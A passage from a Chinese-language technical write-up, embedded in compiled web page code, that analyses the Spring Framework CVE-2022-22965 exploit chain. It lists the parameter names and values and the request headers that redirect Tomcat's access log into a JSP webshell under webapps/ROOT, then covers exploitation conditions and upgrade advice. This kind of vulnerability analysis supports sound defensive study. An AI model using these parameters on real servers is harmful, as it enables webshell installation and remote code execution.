</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击报文中的如下内容的添加也是为了符合access_log格式。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>suffix: %&gt;//
c1: Runtime
c2: &lt;%
DNT: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最终的jsp马如下：(图中为了清楚，使用vscode格式化了一下)</p><figure><img src="`+q+'" alt="image-20230524145857077" tabindex="0" loading="lazy"><figcaption>image-20230524145857077</figcaption></figure><p><strong><code>suffix</code>参数</strong></p><ul><li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code></li><li>参数值：<code>.jsp</code></li></ul><p>按照<code>pattern</code>参数相同的调试方法，<code>suffix</code>参数最终将<code>AccessLogValve.suffix</code>设置为<code>.jsp</code>，即access_log的文件名后缀。</p><p><strong><code>directory</code>参数</strong></p><ul><li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.directory</code></li><li>参数值：<code>webapps/ROOT</code></li></ul><p>按照<code>pattern</code>参数相同的调试方法，<code>directory</code>参数最终将<code>AccessLogValve.directory</code>设置为<code>webapps/ROOT</code>，即access_log的文件输出目录。</p><p>这里提下<code>webapps/ROOT</code>目录，该目录为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过<code>http://localhost:8080/</code>根目录访问。</p><p><strong><code>prefix</code>参数</strong></p><ul><li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.prefix</code></li><li>参数值：<code>tomcatwar</code></li></ul><p>按照<code>pattern</code>参数相同的调试方法，<code>prefix</code>参数最终将<code>AccessLogValve.prefix</code>设置为<code>tomcatwar</code>，即access_log的文件名前缀。</p><p><strong><code>fileDateFormat</code>参数</strong></p><ul><li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</code></li><li>参数值：空</li></ul><p>按照<code>pattern</code>参数相同的调试方法，<code>fileDateFormat</code>参数最终将<code>AccessLogValve.fileDateFormat</code>设置为空，即access_log的文件名不包含日期。</p><h4 id="漏洞利用关键点" tabindex="-1"><a class="header-anchor" href="#漏洞利用关键点" aria-hidden="true">#</a> 漏洞利用关键点</h4><ul><li><p>Web应用部署方式需要是Tomcat war包部署：从<code>java.lang.Module</code>到<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，是将调用链转移到Tomcat，并最终利用<code>AccessLogValve</code>输出webshell，而<code>ParallelWebappClassLoader</code>在Web应用以war包部署到Tomcat中时使用到。</p></li><li><p>在前面的第三个断点也就是<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>处，在JDK 1.9之后，Java为了支持模块化，在<code>java.lang.Class</code>中增加了<code>module</code>属性和对应的<code>getModule()</code>方法，此时才能实现漏洞利用，以前的版本不支持。</p></li><li><p>某些版本的tomcat也不支持此利用链，不同版本的组合结果也不同，测试结果如下：</p><img src="'+B+'" alt="image-20230524105443051" style="zoom:80%;"></li></ul><p>安全起见，升级Spring到5.3.18以上版本，tomcat到9.0.62以上版本。</p>',54);function T(j,z){const s=t("ExternalLinkIcon");return r(),o("div",null,[L,e("blockquote",null,[e("p",null,[a("参考："),e("a",N,[a("GitHub - wshon/spring-framework-rce: CVE-2022-22965"),p(s)])])]),J])}const E=i(O,[["render",T],["__file","spring.html.vue"]]);export{E as default};
